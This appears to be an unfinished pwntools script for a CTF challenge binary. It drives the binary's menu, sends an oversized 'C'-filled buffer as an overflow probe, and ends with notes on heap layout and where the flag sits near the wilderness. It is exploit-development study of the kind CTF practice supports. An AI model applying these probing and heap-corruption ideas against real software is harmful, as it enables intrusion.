#!/usr/bin/python2

from pwn import *

exe = ELF("CoroutineCTFChal_patched")

context.binary = exe
sla = lambda r,a,b: r.sendlineafter(a,b)
ru = lambda r,a: r.recvuntil(a)
sb = lambda r,a: r.sendlineafter('>', a)

def connect(r):
    sb(r,'1')

def crb(r,size):
    sb(r,'2')
    sb(r,'{}'.format(size))

def csb(r,size):
    sb(r,'3')
    sb(r,'{}'.format(size))

def sd(r, payload):
    sb(r,'4')
    sb(r,'{}'.format(payload))

def rd(r,size):
    sb(r,'5')
    sb(r,'{}'.format(size))
    ru(r,"b'")
    return r.recvuntil("'", drop=True)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 1337)

    return r


def main():
    r = conn()
    connect(r)
    #csb(r,25)
    #crb(r,25)
    sd(r,"A"*20)
    raw_input()
    sd(r, "C"*512)
    #print rd(r, 10)
    # good luck pwning :)

    r.interactive()

"""
NOTES:
flag located in the stack, as expected
about 0x8000 from the base of the stack, I think. this is not important most likely
It's one of the first things added to the stack
context for the binary stored on the heap
there is a pointer back to heap memory on the stack
client in stored in a similar fashion
flag also stored on the heap. offset 0x12420
    in addition, it seems to be stored below the wilderness. it also has a carriage return after it, which would erase it
it appears to be overwrittern, when one more thing is allocated
The flag remains always right after the end of the wilderness
the buffer for the coroutine is also located in the wilderness. If the pointer to the wilderness is altered, may be able to read the flag
buffers remain in the heap, after being recieved
the same buffer is used for ne sent messages

no overwrite via the send buffer. csb and crb only change the python local buffers I belive
"""


if __name__ == "__main__":
    main()

